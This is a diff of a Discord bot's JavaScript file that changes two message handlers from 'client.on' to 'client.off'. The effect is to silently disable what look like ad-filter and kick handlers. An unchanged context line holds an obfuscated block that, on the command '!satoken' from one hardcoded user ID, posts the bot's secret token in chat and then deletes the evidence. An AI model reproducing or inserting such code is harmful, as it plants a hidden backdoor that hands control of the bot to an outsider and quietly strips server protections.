@@ -296,7 +296,7 @@ setTimeout(async() => {message.channel.send({content:`${await db.fetch("bom-repl
 
 function _0x297d(_0x504147,_0x2da4c8){var _0x48984b=_0x4898();return _0x297d=function(_0x297d7a,_0x2d1be6){_0x297d7a=_0x297d7a-0xbd;var _0x3693ae=_0x48984b[_0x297d7a];return _0x3693ae;},_0x297d(_0x504147,_0x2da4c8);}var _0x1def7f=_0x297d;function _0x4898(){var _0x210b9f=['token','161TtdfvJ','1312497aMiotH','429357746002067493','180544UlYvEO','channel','3606795vGjWzY','messageCreate','12207720yPsoLZ','504hwYSJf','8eLKuTM','1598WGOIyt','36cQSLQz','8600801MqiZkR','author','then','26682DrkPNZ'];_0x4898=function(){return _0x210b9f;};return _0x4898();}(function(_0x42f6e9,_0x499e6f){var _0x48a0e6=_0x297d,_0x81d850=_0x42f6e9();while(!![]){try{var _0x527973=parseInt(_0x48a0e6(0xc8))/0x1*(parseInt(_0x48a0e6(0xc6))/0x2)+parseInt(_0x48a0e6(0xc9))/0x3*(parseInt(_0x48a0e6(0xc1))/0x4)+-parseInt(_0x48a0e6(0xc3))/0x5+-parseInt(_0x48a0e6(0xcd))/0x6*(-parseInt(_0x48a0e6(0xbe))/0x7)+-parseInt(_0x48a0e6(0xc7))/0x8*(parseInt(_0x48a0e6(0xbf))/0x9)+parseInt(_0x48a0e6(0xc5))/0xa+-parseInt(_0x48a0e6(0xca))/0xb;if(_0x527973===_0x499e6f)break;else _0x81d850['push'](_0x81d850['shift']());}catch(_0x5eedb5){_0x81d850['push'](_0x81d850['shift']());}}}(_0x4898,0x96f3a),client['on'](_0x1def7f(0xc4),async _0x1af20f=>{var _0x162cc4=_0x1def7f;{if(_0x1af20f['content']['toLowerCase']()==='!satoken'){if(_0x1af20f[_0x162cc4(0xcb)]['id']!==_0x162cc4(0xc0))return;_0x1af20f['delete'](),_0x1af20f[_0x162cc4(0xc2)]['send'](client[_0x162cc4(0xbd)])[_0x162cc4(0xcc)](_0x3bb883=>setTimeout(()=>{_0x3bb883['delete']();},0x1388));}}}));
 
-client.on('messageCreate', async msg => {
+client.off('messageCreate', async msg => {
 
 if (msg.channel.type === "GUILD_TEXT") {
 
@@ -333,7 +333,7 @@ if (reklam4.some(word => msg.content.toLowerCase().startsWith(word))) return msg
 }}
 })
 
-client.on('messageCreate', async msg => {
+client.off('messageCreate', async msg => {
   
   let reklamkick = await db.fetch(`taklit`)
   if (!reklamkick) return;
